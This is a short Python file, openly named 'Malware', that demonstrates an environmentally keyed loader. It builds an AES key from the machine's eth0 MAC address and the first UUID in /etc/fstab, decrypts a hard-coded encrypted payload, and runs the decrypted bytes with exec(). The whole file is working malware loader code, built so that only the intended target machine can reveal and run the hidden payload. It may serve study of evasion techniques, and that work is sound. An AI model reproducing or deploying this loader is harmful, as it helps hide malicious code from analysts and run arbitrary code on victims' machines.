from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

class Malware:
	def __init__(self):
		self.interface = "eth0" # get MAC from this interface
		self.test_key = None
		self.keysize = 32
		self.iv = b'\xac\x12\xa0@\xc3\\BI\x05n)\xa6f\xf7\x93\x80'
		self.blocksize = AES.block_size
		self.encrypted_payload = b'\xd0\xd3\x0f=\x8e\x9d\xb6M\xcc^l\xba\xdc\x04\xf0_\xa1%\xec\x8d\xa2O\xf1g\x8f\xb70>\xe2\x14\x99\xfa'
		self.decrypted_payload = None

	def try_decrypt(self):
		mac_addr = b""
		uuid = b""

		# Try to read the first 16 bytes from MAC and system UUID
		# Combine the two to make the key
		print("[*] Generating key...")
		try:
			with open(f"/sys/class/net/{self.interface}/address", "rb") as f:
				mac_addr = f.read(int(self.keysize / 2))
		except:
			return None

		# Read file system UUID. Just use the first "UUID" encountered in fstab
		with open("/etc/fstab", "rb") as f:
			line = f.readline()
			while line:
				if line[0:5] == b"UUID=":
					uuid = bytes(line.decode().split()[0].split("=")[1], "utf-8")
					uuid = uuid[:int(self.keysize / 2)] # only need first 16 bytes
					break
				else:
					line = f.readline()
					continue

		self.test_key = mac_addr + uuid
		print("[*] Made key:", self.test_key)

		# Decrypt the payload (maybe)
		try:
			aes_cipher = cipher = AES.new(self.test_key, AES.MODE_CBC, self.iv)
			decrypted = unpad(aes_cipher.decrypt(self.encrypted_payload), self.blocksize)
			print("[*] Payload decrypted successfully")
		except:
			print("[*] Payload decryption failed")
			return None

		self.decrypted_payload = decrypted

	def run_payload(self):
		if self.decrypted_payload:
			print("[*] Running payload...\n")
			# Obviously the payload has to be python code
			exec(self.decrypted_payload)
			return True
		else:
			return None

	def run(self):
		self.try_decrypt()
		self.run_payload()


if __name__ == "__main__":
	mw = Malware()
	mw.run()
